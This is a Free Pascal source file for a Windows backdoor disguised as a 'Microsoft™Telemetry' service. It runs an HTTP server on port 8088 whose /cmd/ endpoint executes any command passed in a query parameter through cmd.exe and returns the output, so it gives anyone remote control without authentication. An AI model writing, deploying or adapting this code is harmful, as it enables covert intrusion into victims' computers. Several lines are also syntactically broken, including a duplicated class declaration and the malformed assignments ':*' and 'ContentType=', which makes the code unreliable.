{
Title: Microsoft Telemetry
Author: ShowNadda
Version: 1.0
}
program project1;

{INFO: This is used to target only Windows as the OS to compile to}
uses
 {$IFDEF UNIX}cthreads, cmem,{$ENDIF}
 {$IFDEF MSWINDOWS}
  ServiceManager,
{$ENDIF}
  SysUtils,fphttpapp,httpdefs,custweb,custhttpapp,fphttpserver,process, windows,httproute,fpwebfile,fpjson, jsonparser,classes,DaemonApp;

{INFO: This where we define and create the HTTPApplication, that the Backdoor Service will Host}

const

  BUF_SIZE = 2048;
  fileLocation = 'app';

type
    { TMyHttpApplication }

    TMyHttpApplication = class(TCustomHTTPApplication)

    protected

    end;

   { TMyDaemonApplication }

  TMyDaemonApplication = class
  public
    procedure Run;
    procedure Terminate;
  end;

  { TMyDaemonThread }

  TMyDaemonThread = class(TThread)
  public
    procedure Execute; override;
  end;

  TMyDaemonThread = class(TThread)
  public
    procedure Execute; override;
  end;

  { TMyHttpDaemon }

  TMyHttpDaemon = class(TCustomDaemon)
  private
    FThread: TThread;
  public
    function Install: Boolean; override;
    function Uninstall: Boolean; override;
    function Start: Boolean; override;
    function Stop: Boolean; override;
  end;

  { TMyHttpDaemonMapper }

  TMyHttpDaemonMapper = class(TCustomDaemonMapper)
  public
    constructor Create(AOwner: TComponent); override;
  end;


  { Get Current Directory and File Path location }
function SystemFolder: string;
  begin
    SetLength(Result, Windows.MAX_PATH);
    SetLength(
      Result, Windows.GetSystemDirectory(PChar(Result), Windows.MAX_PATH)
    );
  end;

  { CMD Command Function }

function exec_this(command:String):string;
  var
  Process: Tprocess;
  list,outp : Tstringlist;
  OutputStream,Param : TStream;
  BytesRead    : longint;
  Buffer       : array[1..BUF_SIZE] of byte;
  ID: dword;
  begin

    list := Tstringlist.Create;
    outp := Tstringlist.Create;

    process := Tprocess.Create(nil);
    OutputStream := TMemoryStream.Create;
    Param := TMemoryStream.Create; // we are going to store outputs as memory stream .
    //Param.
    process.Executable:=systemfolder+'\cmd.exe';
    process.Parameters.Add('/c');
    process.Parameters.Add(command);

    process.Options:= Process.Options +[poUsePipes];
  //  for i:=0 to list.Count-1 do begin
    try
    process.Execute;
    //process.Free;

    repeat
     // Get the new data from the process to a maximum of the buffer size that was allocated.
     // Note that all read(...) calls will block except for the last one, which returns 0 (zero).
       BytesRead := Process.Output.Read(Buffer, BUF_SIZE);
       OutputStream.Write(Buffer, BytesRead)
     until BytesRead = 0;    //stop if no more data is being recieved
     outputstream.Position:=0;
     outp.LoadFromStream(outputstream);
     process.ExitCode;
      result := outp.Text;

   finally
     process.Free;
     list.Free;
     outp.Free;
     outputstream.Free;
       end;
   end;

procedure rerouteRoot(aRequest: TRequest; aResponse: TResponse);
  begin
    aResponse.Code := 301;
    aResponse.SetCustomHeader('Location', fileLocation + '/index.html');
    aResponse.SendContent;
  end;

procedure jsonresponse(var res: TResponse; data:String);
begin
res.content :* data;
res.code := 200;
res.ContentType= 'application/json';
res.ContentLength := length(res.content);
res.sendcontent;
end;

procedure systemCall(req: TRequest; res: TResponse);
var
  jObject : TJSONObject;
  bla,outp:string;

begin
  jObject := TJSONObject.Create;
  try

    bla := req.QueryFields.Values['na'];
    outp := exec_this(bla);
    jObject.Add('cmd', outp);
    jsonResponse(res, jObject.AsJSON);

  finally
    jObject.Free;
    end;
  end;

{ TMyDaemonApplication }

procedure TMyDaemonApplication.Run;
begin
  Application.Run;
end;

procedure TMyDaemonApplication.Terminate;
begin
  Application.Terminate;
end;

var
  _MyApp: TMyHttpApplication = nil;
  MY_HTTP_DAEMON_DESCRIPTION: string = 'Microsoft™Telemetry';
  MY_HTTP_DAEMON_DISPLAYNAME: string = 'Microsoft™Telemetry';
  MY_HTTP_DAEMON_NAME: string = 'Microsoft™Telemetry';
  MY_HTTP_DAEMON_CLASSNAME: string = 'TMyHttpDaemon';

  function MyApp: TMyHttpApplication;
    begin
      if not Assigned(_MyApp) then
      begin
    _MyApp := TMyHttpApplication.Create(nil);

    _MyApp.Port := 8088;
    RegisterFileLocation(fileLocation, 'public_html');
    HTTPRouter.RegisterRoute('/', @rerouteRoot);
    MimeTypesFile := ExtractFilePath(ParamStr(0)) + 'mime.types';
    HTTPRouter.RegisterRoute('/cmd/', @systemCall);
   _MyApp.Threaded := True;
   _MyApp.Initialize;
      end;
      Result := _MyApp;
    end;

procedure TMyDaemonThread.Execute;
  begin
    MyApp.Run;
  end;

{ TMyHttpDaemon }

  function TMyHttpDaemon.Start: Boolean;
  begin
    Result := inherited Start;
    FThread := TMyDaemonThread.Create(True);
    FThread.Start;
  end;

  function TMyHttpDaemon.Stop: Boolean;
  begin
    Result := inherited Stop;
    FThread.Terminate;
  end;

  function TMyHttpDaemon.Install: Boolean;
{$IFDEF MSWINDOWS}
  var
    VSM: TServiceManager;
{$ENDIF}
  begin
    Result := inherited Install;
{$IFDEF MSWINDOWS}
    VSM := TServiceManager.Create(nil);
    try
      VSM.Connect;
      if VSM.Connected then
        VSM.StartService(MY_HTTP_DAEMON_NAME, nil);
      VSM.Disconnect;
    finally
      VSM.Free;
    end;
{$ENDIF}
    WriteLn('Service installed.');
  end;

  function TMyHttpDaemon.Uninstall: Boolean;
{$IFDEF MSWINDOWS}
  var
    VSM: TServiceManager;
{$ENDIF}
  begin
    Result := inherited Uninstall;
{$IFDEF MSWINDOWS}
    VSM := TServiceManager.Create(nil);
    try
      VSM.Connect;
      if VSM.Connected then
        VSM.StopService(MY_HTTP_DAEMON_NAME, True);
      VSM.Disconnect;
    finally
      VSM.Free;
    end;
{$ENDIF}
    WriteLn('Service uninstalled.');
  end;

constructor TMyHttpDaemonMapper.Create(AOwner: TComponent);
  var
    VDaemonDef: TDaemonDef;
  begin
    inherited Create(AOwner);
    VDaemonDef := DaemonDefs.Add as TDaemonDef;
    VDaemonDef.Description := MY_HTTP_DAEMON_DESCRIPTION;
    VDaemonDef.DisplayName := MY_HTTP_DAEMON_DISPLAYNAME;
    VDaemonDef.Name := MY_HTTP_DAEMON_NAME;
    VDaemonDef.DaemonClassName := MY_HTTP_DAEMON_CLASSNAME;
    VDaemonDef.WinBindings.ServiceType := stWin32;
  end;

begin
  RegisterDaemonClass(TMyHttpDaemon);
  RegisterDaemonMapper(TMyHttpDaemonMapper);
  with TMyDaemonApplication.Create do
  try
    Run;
  finally
    Free;
  end;
end.
